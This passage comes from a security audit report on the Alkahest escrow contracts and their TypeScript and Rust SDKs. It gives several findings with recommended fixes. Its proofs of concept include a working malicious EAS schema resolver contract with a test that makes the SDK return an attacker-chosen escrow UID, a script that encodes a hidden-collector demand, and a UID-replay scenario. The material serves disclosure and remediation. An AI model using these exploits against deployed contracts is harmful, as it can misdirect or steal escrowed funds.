Path: `sdks/ts/src/config.ts`

```typescript
"GenLayer Bradbury": {
  ...
  referencesEscrowArbiter: zeroAddress,
  ...
},
"Ethereum": {
  ...
  referencesEscrowArbiter: zeroAddress,
  ...
}
```

##### ts-decoder-registration

Path: `sdks/ts/src/utils/demandParsing.ts`

```typescript
if (addresses.referencesEscrowArbiter) {
  decoders[addresses.referencesEscrowArbiter.toLowerCase() as Address] =
    decodeReferencesEscrowDemand as DemandDecoder;
}
```

##### ts-unknown-handling

Path: `sdks/ts/src/utils/demandParsing.ts`

```typescript
export const decodeDemand = (_demand: `0x${string}`): Record<string, never> => ({});

if (!decoder) {
  return { arbiter: demand.arbiter, decoded: { raw: demand.demand }, isUnknown: true };
}
const decoded = decoder(demand.demand);
```

##### rust-decoder-registration

Path: `sdks/rs/src/clients/arbiters/mod.rs`

```rust
registry.register_fn(addresses.references_escrow_arbiter, |_, _, _: Bytes| {
    Ok(DecodedDemand::ReferencesEscrowArbiter)
});
```

##### collect-path

Path: `contracts/src/BaseEscrowObligationUnconditional.sol`

```solidity
(address arbiter, bytes memory demand) = decodeCondition(escrow.data);
if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
    revert InvalidFulfillment();
}
```

##### reclaim-guard

Path: `contracts/src/BaseEscrowObligationUnconditional.sol`

```solidity
if (attestation.expirationTime == 0) revert UnauthorizedCall();
```

#### Recommendation

Treat `0x0` as undeployed everywhere in the SDK layer.

Concretely:
- filter zero addresses out of decoder registries,
- exclude zero addresses from address indexes and lookup helpers,
- fail fast when a supported-chain preset still contains a zero placeholder for any arbiter,
- add regression tests for the Ethereum and GenLayer presets.

Fix checklist:

- [ ] Filter `0x0` / `Address::ZERO` out of arbiter decoder registries and address indexes.
- [ ] Fail fast when a supported-chain preset still contains a zero placeholder for an arbiter.
- [ ] Add regression tests for the real `Ethereum` and `GenLayer Bradbury` presets that assert zero-address arbiters decode as `Unknown` / `isUnknown`.

#### Assumptions

- [x] The victim uses the shipped TS or Rust recursive decoder instead of manually comparing the arbiter address against zero.
- [x] The escrow is created with `expirationTime == 0`, or with an impractically long expiration, so lockup is economically meaningful.
- [x] The selected escrow type accepts an arbitrary arbiter address in its obligation data.

#### Predicted Invalid Reasons

- The decoded object still includes `arbiter: 0x0`, so diligent integrators can notice the zero address themselves.

<a id="finding-alka-18"></a>
### ALKA-18 — Top-level demand extractors silently unwrap every escrow as TrustedOracle and hide alternate arbiter branches

#### Summary

`extractDemandData()` and `getEscrowAndDemand()` always unwrap escrow demand as a TrustedOracle-shaped `(address oracle, bytes data)` envelope and return only the inner payload. For custom arbiters, that can hide settlement-relevant fields from off-chain reviewers, so the helpers can present an incomplete view of the real escrow rule.

#### Context Files

##### extractDemandData and getEscrowAndDemand

Path: `sdks/ts/src/index.ts`
Highlight lines: 1

```typescript
// Extract demand data from an escrow attestation
extractDemandData: <DemandData extends readonly AbiParameter[]>(
  demandAbi: DemandData,
  escrowAttestation: { data: `0x${string}` },
) => { ... }

// Get escrow attestation and extract demand data in one call
getEscrowAndDemand: async <DemandData extends readonly AbiParameter[]>(...) => { ... }

const arbiterDemandAbi = parseAbiParameters("(address arbiter, bytes demand)");
const arbiterDemand = decodeAbiParameters(arbiterDemandAbi, escrowAttestation.data)[0];

const trustedOracleDemandAbi = parseAbiParameters("(address oracle, bytes data)");
const trustedOracleDemand = decodeAbiParameters(trustedOracleDemandAbi, arbiterDemand.demand)[0];

return decodeAbiParameters(demandAbi, trustedOracleDemand.data);
```

##### decodeCondition

Path: `contracts/src/obligations/escrow/default/ERC20EscrowObligation.sol`
Highlight lines: 1

```solidity
struct ObligationData {
    address arbiter;
    bytes demand;
    address token;
    uint256 amount;
}

function decodeCondition(bytes memory data) public pure override returns (address arbiter, bytes memory demand) {
    ObligationData memory decoded = abi.decode(data, (ObligationData));
    return (decoded.arbiter, decoded.demand);
}
```

#### Proof of Concept

Run the `viem` script to encode a custom arbiter demand as `(address oracle, bytes data, address hiddenCollector)`, then compare the helper-equivalent decode with `decodeDemandWithAddresses()`. The helper returns only the inner payload, while the arbiter-aware decoder preserves the raw demand.

##### reproduction script

Path: `sdks/ts`

```bash
cd sdks/ts
node --input-type=module <<"NODE"
import { encodeAbiParameters, decodeAbiParameters, parseAbiParameters } from "viem";
import { decodeDemandWithAddresses, contractAddresses } from "./dist/index.js";

const customArbiter = "0x1111111111111111111111111111111111111111";
const oracle = "0x2222222222222222222222222222222222222222";
const hiddenCollector = "0x3333333333333333333333333333333333333333";
const innerData = encodeAbiParameters(parseAbiParameters("bytes32"), ["0x" + "44".repeat(32)]);

const maliciousDemand = encodeAbiParameters(
  parseAbiParameters("(address oracle, bytes data, address hiddenCollector)"),
  [{ oracle, data: innerData, hiddenCollector }],
);

const escrowData = encodeAbiParameters(
  parseAbiParameters("(address arbiter, bytes demand, address token, uint256 amount)"),
  [{ arbiter: customArbiter, demand: maliciousDemand, token: customArbiter, amount: 1n }],
);

const arbiterDemand = decodeAbiParameters(parseAbiParameters("(address arbiter, bytes demand)"), escrowData)[0];
const trustedOracleDemand = decodeAbiParameters(parseAbiParameters("(address oracle, bytes data)"), arbiterDemand.demand)[0];
const helperDecodedInner = decodeAbiParameters(parseAbiParameters("bytes32"), trustedOracleDemand.data)[0];
const genericDecoded = decodeDemandWithAddresses(
  { arbiter: arbiterDemand.arbiter, demand: arbiterDemand.demand },
  contractAddresses["Base Sepolia"],
);

console.log(JSON.stringify({
  helperDecodedInner,
  helperDiscardedHiddenCollector: !JSON.stringify(trustedOracleDemand).includes(hiddenCollector.toLowerCase()),
  genericDecoderIsUnknown: genericDecoded.isUnknown === true,
  genericDecoderRawMatchesOriginalDemand: genericDecoded.decoded.raw === arbiterDemand.demand,
}, null, 2));
NODE
```

#### Recommendation

Do not expose these helpers as generic demand extractors. Either:
- rename them to TrustedOracle-specific helpers and require `arbiter == contractAddresses.trustedOracleArbiter`, or
- replace them with an arbiter-aware implementation that first decodes `(arbiter, demand)`, then dispatches through `decodeDemand({ arbiter, demand })`, and only returns inner data for arbiters that explicitly opt into that projection.

For example, fail closed unless the arbiter is the known TrustedOracle address:

```typescript
const { arbiter, demand } = decodeAbiParameters(arbiterDemandAbi, escrowAttestation.data)[0];
if (arbiter.toLowerCase() !== addresses.trustedOracleArbiter.toLowerCase()) {
  throw new Error(`Unsupported arbiter for generic demand extraction: ${arbiter}`);
}
const trustedOracleDemand = decodeDemand(demand);
return decodeAbiParameters(demandAbi, trustedOracleDemand.data);
```

#### Assumptions

- [x] An integration uses `extractDemandData()` or `getEscrowAndDemand()` as its primary escrow-inspection path.
- [x] The attacker can choose an arbiter contract whose demand ABI shares the TrustedOracle prefix while enforcing extra or alternate settlement semantics.
- [x] The honest fulfiller or bot does not independently re-parse the actual arbiter address with `decodeDemand()` before acting.

#### Predicted Invalid Reasons

- These are convenience helpers for trusted-oracle workflows. Developers can inspect the arbiter themselves or call `decodeDemand`, and arbitrary arbiters are intentionally supported.

<a id="finding-alka-4"></a>
### ALKA-4 — Atomic attestation helper misattributes nested Attested logs and can hand out a malicious escrow UID

#### Summary

The shipped TypeScript helper for `AtomicAttestationUtils.attestAndCreateReferenceEscrow` ignores the Solidity return values and instead maps the first two `Attested` logs in receipt order to `attestation` and `escrow`. A malicious resolver can emit an extra `Attested` log before the real reference escrow is created, causing the SDK to return an attacker-chosen `escrow.uid`.

#### Context Files

##### AtomicAttestationUtils.attestAndCreateReferenceEscrow

Path: `alkahest/contracts/src/utils/atomic/AtomicAttestationUtils.sol`
Highlight lines: 47, 48

```solidity
function attestAndCreateReferenceEscrow(
    AttestationReferenceEscrowObligation escrow,
    AttestationRequest calldata request,
    ReferenceEscrowData calldata escrowData,
    uint64 escrowExpirationTime
) external payable returns (bytes32 attestationUid, bytes32 escrowUid) {
    attestationUid = _attest(request);
    escrowUid = escrow.doObligationFor(
        AttestationReferenceEscrowObligation.ObligationData({
            arbiter: escrowData.arbiter,
            demand: escrowData.demand,
            attestationUid: attestationUid,
            validationExpirationTime: escrowData.validationExpirationTime,
            validationRevocable: escrowData.validationRevocable
        }),
        escrowExpirationTime,
        msg.sender
    );
}
```

##### attestAndCreateReferenceEscrow helper return mapping

Path: `alkahest/sdks/ts/src/clients/obligations/attestation/util.ts`
Highlight lines: 45

```typescript
const events = await getAttestedEventsFromTxHash(viemClient, hash);
return { hash, attestation: events[0]?.args, escrow: events[1]?.args };
```

##### getAttestedEventsFromTxHash

Path: `alkahest/sdks/ts/src/utils/index.ts`
Highlight lines: 70, 71, 72, 73, 74, 75, 76, 77

```typescript
export const getAttestedEventsFromTxHash = async (client: ViemClient, hash: `0x${string}`): Promise<any[]> => {
  const tx = await client.waitForTransactionReceipt({ hash });
  const events = parseEventLogs({
    abi: iEasAbi.abi,
    eventName: "Attested",
    logs: tx.logs,
  });
  return events;
};
```

##### EAS emits Attested before resolver execution

Path: `alkahest/contracts/lib/eas-contracts/contracts/EAS.sol`
Highlight lines: 479, 482

```solidity
emit Attested(request.recipient, attester, uid, schemaUID);
res.usedValue = _resolveAttestations(schemaRecord, attestations, values, false, availableValue, last);
```

##### SchemaResolver.attest

Path: `alkahest/contracts/lib/eas-contracts/contracts/resolver/SchemaResolver.sol`
Highlight lines: 49, 50

```solidity
function attest(Attestation calldata attestation) external payable onlyEAS returns (bool) {
    return onAttest(attestation, msg.value);
}
```

#### Proof of Concept

1. Build the malicious resolver artifact.
2. Run the focused Bun test.
3. Confirm the helper returns the nested malicious UID in `escrow.uid`, while the actual helper-created escrow is emitted later in the receipt.

##### Build malicious resolver artifact

Path: ``

```bash
export PATH=/home/user/workspace/.local/bin:$PATH
cd /home/user/workspace/alkahest/contracts
timeout 300 forge build -j 1 test/poc/POC_NestedEscrowResolver_fcb31c0e.sol
```

##### Run focused Bun test

Path: ``

```bash
cd /home/user/workspace/alkahest/sdks/ts
timeout 300 bun test tests/unit/POC_atomicAttestationMisparse_fcb31c0e.test.ts --timeout 60000
```

##### POC_NestedEscrowResolver_fcb31c0e.sol

Path: `alkahest/contracts/test/poc/POC_NestedEscrowResolver_fcb31c0e.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {SchemaResolver} from "@eas/resolver/SchemaResolver.sol";
import {IEAS, Attestation} from "@eas/IEAS.sol";
import {
    AttestationReferenceEscrowObligation
} from "@src/obligations/escrow/default/AttestationReferenceEscrowObligation.sol";

contract POC_NestedEscrowResolver_fcb31c0e is SchemaResolver {
    AttestationReferenceEscrowObligation private immutable referenceEscrow;
    address private immutable maliciousArbiter;
    uint64 private immutable maliciousValidationExpirationTime;
    bool private immutable maliciousValidationRevocable;
    uint64 private immutable maliciousEscrowExpirationTime;
    bytes private maliciousDemand;

    bytes32 public lastNestedEscrowUid;

    constructor(
        IEAS _eas,
        AttestationReferenceEscrowObligation _referenceEscrow,
        address _maliciousArbiter,
        bytes memory _maliciousDemand,
        uint64 _maliciousValidationExpirationTime,
        bool _maliciousValidationRevocable,
        uint64 _maliciousEscrowExpirationTime
    ) SchemaResolver(_eas) {
        referenceEscrow = _referenceEscrow;
        maliciousArbiter = _maliciousArbiter;
        maliciousDemand = _maliciousDemand;
        maliciousValidationExpirationTime = _maliciousValidationExpirationTime;
        maliciousValidationRevocable = _maliciousValidationRevocable;
        maliciousEscrowExpirationTime = _maliciousEscrowExpirationTime;
    }

    function onAttest(Attestation calldata attestation, uint256) internal override returns (bool) {
        lastNestedEscrowUid = referenceEscrow.doObligationFor(
            AttestationReferenceEscrowObligation.ObligationData({
                arbiter: maliciousArbiter,
                demand: maliciousDemand,
                attestationUid: attestation.uid,
                validationExpirationTime: maliciousValidationExpirationTime,
                validationRevocable: maliciousValidationRevocable
            }),
            maliciousEscrowExpirationTime,
            tx.origin
        );

        return true;
    }

    function onRevoke(Attestation calldata, uint256) internal pure override returns (bool) {
        return true;
    }
}
```

##### POC_atomicAttestationMisparse_fcb31c0e.test.ts

Path: `alkahest/sdks/ts/tests/unit/POC_atomicAttestationMisparse_fcb31c0e.test.ts`

```typescript
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { decodeAbiParameters, encodeAbiParameters, parseAbiParameters, parseEventLogs } from "viem";
import { abi as easAbi } from "../../src/contracts/IEAS";
import { abi as schemaRegistryAbi } from "../../src/contracts/eas/SchemaRegistry";
import { setupTestEnvironment, type TestContext } from "../utils/setup";
import { teardownTestEnvironment } from "../utils/teardownTestEnvironment";
import NestedEscrowResolver from "../../../../contracts/out/POC_NestedEscrowResolver_fcb31c0e.sol/POC_NestedEscrowResolver_fcb31c0e.json";

/**
 * @title POC: Atomic attestation helper returns a resolver-created escrow UID
 * @notice Proof Statement: Proves that a malicious schema resolver can create a nested
 * reference escrow during `onAttest`, causing the shipped TypeScript helper to return
 * the resolver-created escrow UID in `escrow.uid` instead of the actual escrow created
 * later by `AtomicAttestationUtils.attestAndCreateReferenceEscrow`.
 */
describe("POC_atomicAttestationMisparse_fcb31c0e", () => {
  let testContext: TestContext;

  const zeroHash = "0x0000000000000000000000000000000000000000000000000000000000000000" as const;

  beforeEach(async () => {
    testContext = await setupTestEnvironment();
  });

  afterEach(async () => {
    await teardownTestEnvironment(testContext);
  });

  async function registerSchema(resolver: `0x${string}`) {
    const hash = await testContext.alice.client.viemClient.writeContract({
      address: testContext.addresses.easSchemaRegistry,
      abi: schemaRegistryAbi.abi,
      functionName: "register",
      args: [`poc nested escrow schema ${Date.now()}`, resolver, true],
    });

    const receipt = await testContext.testClient.waitForTransactionReceipt({ hash });
    const log = receipt.logs[0];
    if (!log) throw new Error("No schema registration log found");
    return log.topics[1] as `0x${string}`;
  }

  function decodeReferenceEscrowData(data: `0x${string}`) {
    return decodeAbiParameters(
      parseAbiParameters(
        "(address arbiter, bytes demand, bytes32 attestationUid, uint64 validationExpirationTime, bool validationRevocable)",
      ),
      data,
    )[0];
  }

  test("attestAndCreateReferenceEscrow returns the nested resolver escrow", async () => {
    const now = BigInt(Math.floor(Date.now() / 1000));
    const maliciousValidationExpirationTime = now + 7n * 86_400n;
    const maliciousEscrowExpirationTime = now + 30n * 86_400n;
    const intendedEscrowExpirationTime = now + 2n * 86_400n;

    const maliciousDemand = encodeAbiParameters(
      parseAbiParameters("address token, uint256 amount, address payee"),
      [testContext.mockAddresses.erc20A, 1n, testContext.bob.address],
    );

    const maliciousResolver = await testContext.deployContract(NestedEscrowResolver as any, [
      testContext.addresses.eas,
      testContext.addresses.attestationReferenceEscrowObligation,
      testContext.addresses.referencesEscrowArbiter,
      maliciousDemand,
      maliciousValidationExpirationTime,
      true,
      maliciousEscrowExpirationTime,
    ]);

    const outerSchema = await registerSchema(maliciousResolver);
    const intendedDemand = "0x1234" as `0x${string}`;

    const { hash, attestation, escrow } = await testContext.alice.client.attestation.util.attestAndCreateReferenceEscrow(
      {
        schema: outerSchema,
        data: {
          recipient: testContext.bob.address,
          expirationTime: now + 86_400n,
          revocable: true,
          refUID: zeroHash,
          data: "0x1234",
          value: 0n,
        },
      },
      {
        arbiter: testContext.addresses.trivialArbiter,
        demand: intendedDemand,
        validationExpirationTime: 0n,
        validationRevocable: false,
      },
      intendedEscrowExpirationTime,
    );

    const nestedEscrowUid = (await testContext.testClient.readContract({
      address: maliciousResolver,
      abi: (NestedEscrowResolver as any).abi,
      functionName: "lastNestedEscrowUid",
      args: [],
    })) as `0x${string}`;

    const receipt = await testContext.testClient.waitForTransactionReceipt({ hash });
    const attestedEvents = parseEventLogs({
      abi: easAbi.abi,
      eventName: "Attested",
      logs: receipt.logs,
    });

    const referenceEscrowEvents = attestedEvents.filter(
      (event) =>
        event.args.attester?.toLowerCase() === testContext.addresses.attestationReferenceEscrowObligation.toLowerCase(),
    );

    const actualEscrowUid = referenceEscrowEvents
      .map((event) => event.args.uid as `0x${string}`)
      .find((uid) => uid !== nestedEscrowUid);

    if (!actualEscrowUid) {
      throw new Error("Could not identify the actual helper-created escrow UID");
    }

    const nestedEscrowAttestation = await testContext.alice.client.getAttestation(nestedEscrowUid);
    const actualEscrowAttestation = await testContext.alice.client.getAttestation(actualEscrowUid);
    const decodedNestedEscrow = decodeReferenceEscrowData(nestedEscrowAttestation.data);
    const decodedActualEscrow = decodeReferenceEscrowData(actualEscrowAttestation.data);

    console.log("helper escrow uid:", escrow?.uid);
    console.log("nested malicious uid:", nestedEscrowUid);
    console.log("actual helper escrow uid:", actualEscrowUid);

    expect(attestedEvents).toHaveLength(3);
    expect(referenceEscrowEvents).toHaveLength(2);
    expect(attestation?.uid).not.toBe(zeroHash);
    expect(nestedEscrowUid).not.toBe(zeroHash);
    expect(escrow?.uid).toBe(nestedEscrowUid);
    expect(escrow?.uid).not.toBe(actualEscrowUid);
    expect(attestedEvents[1]?.args.uid).toBe(nestedEscrowUid);
    expect(attestedEvents[2]?.args.uid).toBe(actualEscrowUid);
    expect(escrow?.recipient.toLowerCase()).toBe(testContext.alice.address.toLowerCase());
    expect(escrow?.attester.toLowerCase()).toBe(testContext.addresses.attestationReferenceEscrowObligation.toLowerCase());
    expect(nestedEscrowAttestation.schema).toBe(actualEscrowAttestation.schema);
    expect(nestedEscrowAttestation.attester.toLowerCase()).toBe(actualEscrowAttestation.attester.toLowerCase());
    expect(decodedNestedEscrow.attestationUid).toBe(attestation!.uid);
    expect(decodedNestedEscrow.arbiter.toLowerCase()).toBe(testContext.addresses.referencesEscrowArbiter.toLowerCase());
    expect(decodedNestedEscrow.demand).toBe(maliciousDemand);
    expect(decodedNestedEscrow.validationExpirationTime).toBe(maliciousValidationExpirationTime);
    expect(decodedNestedEscrow.validationRevocable).toBe(true);
    expect(decodedActualEscrow.attestationUid).toBe(attestation!.uid);
    expect(decodedActualEscrow.arbiter.toLowerCase()).toBe(testContext.addresses.trivialArbiter.toLowerCase());
    expect(decodedActualEscrow.demand).toBe(intendedDemand);
    expect(decodedActualEscrow.validationExpirationTime).toBe(0n);
    expect(decodedActualEscrow.validationRevocable).toBe(false);
  });
});
```

#### Recommendation

Do not infer `attestationUid` and `escrowUid` from raw `Attested` log positions.

Primary fix:

- Decode the helper call result directly when possible, or
- filter receipt logs by the expected attester/schema pair for each object before assigning `attestation` and `escrow`.

A robust TypeScript fix is to require:

1. the first returned object to have `schema == request.schema` and `attester == request attester/caller context`, and
2. the escrow object to have `attester == addresses.attestationReferenceEscrowObligation` and the reference-escrow schema.

If direct return-value decoding is not available in the write path, derive the escrow UID by fetching the known reference-escrow schema and filtering receipt logs accordingly instead of indexing `events[1]`.

#### Assumptions

- [x] A downstream integration treats the helper-returned `escrow.uid` as authoritative.
- [x] The selected schema resolver can execute arbitrary code and emit nested `Attested` logs during `onAttest`.
- [x] The poisoned UID may be reused in later settlement or provenance flows.

#### Predicted Invalid Reasons

- Users who choose arbitrary schemas and resolvers are responsible for trusting them, and the transaction still creates the real escrow on-chain.

<a id="finding-alka-15"></a>
### ALKA-15 — createFulfillment accepts replayed same-contract UIDs and can retroactively assign EXECUTOR_SENTINEL payouts

#### Summary

`BaseSplitter.createFulfillment` accepts a caller-chosen obligation contract and records `msg.sender` as the fulfiller after only validating the returned attestation's current fields. A replay-capable same-attester obligation can return an older unrecorded splitter-addressed UID, letting the attacker claim `fulfillers[uid]` and later receive any `EXECUTOR_SENTINEL` payout tied to that fulfillment.

#### Context Files

##### createFulfillment writes fulfiller

Path: `alkahest/contracts/src/utils/splitters/BaseSplitter.sol`
Highlight lines: 1, 2, 3, 4

```solidity
fulfillmentUid = IObligation(obligationContract).doObligationRaw{value: msg.value}(data, expirationTime, refUID);
_validateCreatedFulfillment(fulfillmentUid, obligationContract, data, expirationTime, refUID);
if (fulfillers[fulfillmentUid] != address(0)) revert FulfillerAlreadyRecorded(fulfillmentUid);
fulfillers[fulfillmentUid] = msg.sender;
```

##### attestation freshness validation

Path: `alkahest/contracts/src/utils/splitters/BaseSplitter.sol`
Highlight lines: 1, 7, 8, 9, 10, 12

```solidity
function _validateCreatedFulfillment(
    bytes32 fulfillmentUid,
    address obligationContract,
    bytes calldata data,
    uint64 expirationTime,
    bytes32 refUID
) internal view {
    Attestation memory fulfillment = eas.getAttestation(fulfillmentUid);
    if (
        fulfillment.uid != fulfillmentUid || fulfillment.attester != obligationContract
            || fulfillment.recipient != address(this) || fulfillment.expirationTime != expirationTime
            || fulfillment.refUID != refUID || keccak256(fulfillment.data) != keccak256(data)
    ) {
        revert InvalidCreatedFulfillment(fulfillmentUid);
    }
}
```

##### same-attester replay test

Path: `alkahest/contracts/test/unit/utils/splitters/ERC20Splitter.t.sol`
Highlight lines: 1, 2, 3, 5, 6, 7

```solidity
vm.mockCall(
    address(stringObligation),
    abi.encodeWithSignature("doObligationRaw(bytes,uint64,bytes32)", obligationData, uint64(0), escrowUid),
    abi.encode(fulfillmentUid)
);

vm.expectRevert(abi.encodeWithSelector(BaseSplitter.FulfillerAlreadyRecorded.selector, fulfillmentUid));
splitter.createFulfillment(address(stringObligation), obligationData, 0, escrowUid);
```

#### Proof of Concept

- A replay-capable obligation pre-creates a splitter-addressed attestation for an honest executor.
- The attacker later calls `createFulfillment` and the obligation returns that same UID from `doObligationRaw`.
- `_validateCreatedFulfillment` only checks the current EAS fields, so the replay passes if `fulfillers[uid]` is still empty.
- `createFulfillment` then records the attacker as `msg.sender`, and any `EXECUTOR_SENTINEL` leg for that UID pays the attacker.

##### createFulfillment flow

Path: `alkahest/contracts/src/utils/splitters/BaseSplitter.sol`

```solidity
fulfillmentUid = IObligation(obligationContract).doObligationRaw{value: msg.value}(data, expirationTime, refUID);
_validateCreatedFulfillment(fulfillmentUid, obligationContract, data, expirationTime, refUID);
if (fulfillers[fulfillmentUid] != address(0)) revert FulfillerAlreadyRecorded(fulfillmentUid);
fulfillers[fulfillmentUid] = msg.sender;
```

##### created fulfillment validation

Path: `alkahest/contracts/src/utils/splitters/BaseSplitter.sol`

```solidity
function _validateCreatedFulfillment(
    bytes32 fulfillmentUid,
    address obligationContract,
    bytes calldata data,
    uint64 expirationTime,
    bytes32 refUID
) internal view {
    Attestation memory fulfillment = eas.getAttestation(fulfillmentUid);
    if (
        fulfillment.uid != fulfillmentUid || fulfillment.attester != obligationContract
            || fulfillment.recipient != address(this) || fulfillment.expirationTime != expirationTime
            || fulfillment.refUID != refUID || keccak256(fulfillment.data) != keccak256(data)
    ) {
        revert InvalidCreatedFulfillment(fulfillmentUid);
    }
}
```

##### same-attester replay test

Path: `alkahest/contracts/test/unit/utils/splitters/ERC20Splitter.t.sol`

```solidity
vm.mockCall(
    address(stringObligation),
    abi.encodeWithSignature("doObligationRaw(bytes,uint64,bytes32)", obligationData, uint64(0), escrowUid),
    abi.encode(fulfillmentUid)
);

vm.expectRevert(abi.encodeWithSelector(BaseSplitter.FulfillerAlreadyRecorded.selector, fulfillmentUid));
splitter.createFulfillment(address(stringObligation), obligationData, 0, escrowUid);
```

#### Recommendation

Prove that the attestation was minted in the current call, not just that it presently exists.

Primary fix:

```solidity
uint64 beforeTime = uint64(block.timestamp);
fulfillmentUid = IObligation(obligationContract).doObligationRaw{value: msg.value}(data, expirationTime, refUID);
Attestation memory fulfillment = eas.getAttestation(fulfillmentUid);
if (fulfillment.time < beforeTime) revert InvalidCreatedFulfillment(fulfillmentUid);
```

A stronger fix is to require the obligation contract to return additional freshness evidence (for example, a nonce or attestation count) or to expose a dedicated helper-only entrypoint that cannot replay pre-existing UIDs.

#### Assumptions

- [x] The obligation contract can return an existing UID under its own attester address instead of minting a fresh attestation.
- [x] The replayed UID has not already been recorded in `fulfillers`.
- [x] At least one split uses `EXECUTOR_SENTINEL` for payout routing.

#### Predicted Invalid Reasons

- Our built-in fulfillment contracts do not replay UIDs, so this requires a malicious external obligation and is outside the normal flow.

<a id="low"></a>
## Low

<a id="finding-alka-13"></a>
### ALKA-13 — Stale Base Sepolia address metadata still points default users to a token-bundle escrow with permissionless destructive partial settlement

#### Summary

Stale Base Sepolia metadata still publishes the pre-fix `TokenBundleEscrowObligation` address `0x38e8E5684aFB24A88cD9B276032bCBD19C4b9d6e` through docs, deployment JSON, and `alkahest-mcp`, while the maintained SDK/CLI configs use `0xC52c611c0C9A11fF625B93f9D1fb9E74C45d9859`. The main risk is downstream integrations that trust the stale discovery surfaces.

#### Context Files

##### deployment_base_sepolia.json

Path: `contracts/deployments/deployment_base_sepolia.json`
Highlight lines: 41

```json
"tokenBundleEscrowObligation": "0x38e8E5684aFB24A88cD9B276032bCBD19C4b9d6e"
```

##### parse-deployments.ts

Path: `docs/mcp-server/scripts/parse-deployments.ts`
Highlight lines: 8

```typescript
const CHAIN_INFO = {
  deployment_base_sepolia: { chainName: "Base Sepolia", chainId: 84532 },
  deployment_monad: { chainName: "Monad Testnet", chainId: 143 },
};
```

##### parse-deployments.ts

Path: `docs/mcp-server/scripts/parse-deployments.ts`
Highlight lines: 48

```typescript
if (/deployment_\\d+/.test(fileName)) {
  return null;
}
```

##### Deploy.s.sol

Path: `contracts/script/Deploy.s.sol`
Highlight lines: 485

```solidity
uint256 timestamp = block.timestamp;
string memory filename = string.concat("./deployments/deployment_", vm.toString(timestamp), ".json");
vm.writeJson(finalJson, filename);
```

##### config.ts

Path: `sdks/ts/src/config.ts`
Highlight lines: 71

```typescript
tokenBundleEscrowObligation: "0xC52c611c0C9A11fF625B93f9D1fb9E74C45d9859",
```

##### TokenBundleEscrowObligation.sol

Path: `contracts/src/obligations/escrow/default/TokenBundleEscrowObligation.sol`
Highlight lines: 390

```solidity
if (msg.sender != fulfillment.recipient) revert UnauthorizedCall();
```

##### TokenBundleEscrowObligation.sol

Path: `contracts/src/obligations/escrow/default/TokenBundleEscrowObligation.sol`
Highlight lines: 434

```solidity
if (msg.sender != attestation.recipient) revert UnauthorizedCall();
```

#### Proof of Concept

Stale Base Sepolia metadata still resolves `tokenBundleEscrowObligation` to `0x38e8E5684aFB24A88cD9B276032bCBD19C4b9d6e` in the static deployment JSON, contract-reference docs, and `alkahest-mcp`, even though the maintained SDK config uses `0xC52c611c0C9A11fF625B93f9D1fb9E74C45d9859`. The old address remains live on Base Sepolia and predates the authorization fix for the unsafe partial-settlement paths.

#### Recommendation

Use one canonical deployment manifest for every shipped consumer.

```text
- Update or regenerate `contracts/deployments/deployment_base_sepolia.json` on every redeploy.
- Make `docs/mcp-server/scripts/parse-deployments.ts` ingest the latest per-chain deployment artifact instead of discarding timestamped outputs.
- Generate the contract-reference tables from the same source that populates SDK address maps.
- Add a CI check that diffs published docs/deployment metadata against the canonical address map.
```

Fix checklist:

- [ ] Regenerate or update `contracts/deployments/deployment_base_sepolia.json` on every Base Sepolia redeploy.
- [ ] Make `docs/mcp-server/scripts/parse-deployments.ts` ingest the latest per-chain deployment artifact instead of discarding timestamped outputs.
- [ ] Generate the contract-reference tables from the same canonical source that populates SDK address maps.
- [ ] Add a CI diff that compares published deployment metadata against the canonical address map.

#### Assumptions

- [x] The obsolete Base Sepolia deployment remains live and callable at the published address.
- [x] The integration discovers addresses from the repo’s published Base Sepolia metadata rather than overriding them manually.
- [x] A realistic failing transfer path exists for the bundle, which is the scenario these unsafe escape hatches are meant to handle.

#### Predicted Invalid Reasons

- This is deployment/documentation drift, not a vulnerability in the current client or contract path.

<a id="finding-alka-14"></a>
### ALKA-14 — Zero-address references arbiter is surfaced as a safe known policy on supported chains

#### Summary

On supported `Ethereum` and `GenLayer Bradbury`, `referencesEscrowArbiter` is configured as `address(0)`, but the shipped SDK helpers still treat that zero placeholder as a known module. That causes `decodeDemandWithAddresses({ arbiter: 0x0, demand: 0x })` to return a normal decode, `lookupAddress(0x0)` to label `references_escrow_arbiter`, and zero-arbiter default escrows to become uncollectable until reclaim after expiry.

#### Context Files

##### config.ts

Path: `alkahest/sdks/ts/src/config.ts`
Highlight lines: 4

```ts
"Ethereum": {
  ...unreleasedAddresses,
  ...
  erc8004Arbiter: "0xBE7fE4d7CEb2140eeBdf01e12D198AEBAdC1F54D",
  referencesEscrowArbiter: zeroAddress,
  nativeTokenEscrowObligation: "0x9bA50DB048d1E5db034377abf97F92496D027C71",
}
```

##### demandParsing.ts

Path: `alkahest/sdks/ts/src/utils/demandParsing.ts`
Highlight lines: 1

```ts
if (addresses.referencesEscrowArbiter) {
  decoders[addresses.referencesEscrowArbiter.toLowerCase() as Address] =
    decodeReferencesEscrowDemand as DemandDecoder;
}
```

##### addressIndex.ts

Path: `alkahest/sdks/ts/src/addressIndex.ts`
Highlight lines: 3

```ts
{ contract: "referencesEscrowArbiter", section: "arbiters_addresses", field: "references_escrow_arbiter" },
...
const address = addresses[slot.contract];
if (!address) continue;
index[key].push({ address, section: slot.section, field: slot.field, contract: slot.contract, ... });
```

##### BaseEscrowObligation.sol

Path: `alkahest/contracts/src/BaseEscrowObligation.sol`
Highlight lines: 2

```solidity
(address arbiter, bytes memory demand) = decodeCondition(escrow.data);
if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
  revert InvalidFulfillment();
}
```

#### Proof of Concept

Run the Bun PoC below. It verifies that `decodeDemandWithAddresses({ arbiter: 0x0, demand: 0x })` is treated as known on supported `Ethereum`, then creates a default ERC20 escrow with `arbiter = address(0)` and shows `collect` fails while `reclaim` succeeds after expiry.

##### POC_zeroAddressReferencesArbiter_bca8b800.test.ts

Path: `sdks/ts/tests/unit/POC_zeroAddressReferencesArbiter_bca8b800.test.ts`

```ts
import { describe, expect, test } from "bun:test";
import { parseAbi } from "viem";
import { contractAddresses, decodeDemandWithAddresses, lookupAddress } from "../../src";
import { setupTestEnvironment } from "../utils/setup";
import { teardownTestEnvironment } from "../utils/teardownTestEnvironment";

/**
 * @title POC: Zero-address references arbiter is treated as known on supported chains
 * @notice Proof Statement: This test proves two linked behaviors. First, the shipped Ethereum address map registers
